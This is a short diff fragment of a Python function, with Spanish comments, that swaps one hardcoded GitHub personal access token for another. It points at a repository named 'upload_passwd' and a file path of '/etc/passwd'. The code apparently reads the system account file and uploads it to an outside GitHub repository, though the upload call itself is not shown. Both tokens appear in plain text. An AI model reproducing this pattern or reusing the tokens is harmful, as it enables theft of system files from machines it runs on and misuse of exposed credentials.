@@ -2,7 +2,7 @@ def run(user, repo, token):
   import requests
 
   # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
-  token = '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'
+  token = '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'
   repo_owner = 'Oxitocinaa'
   repo_name = 'upload_passwd'
   file_path = '/etc/passwd'
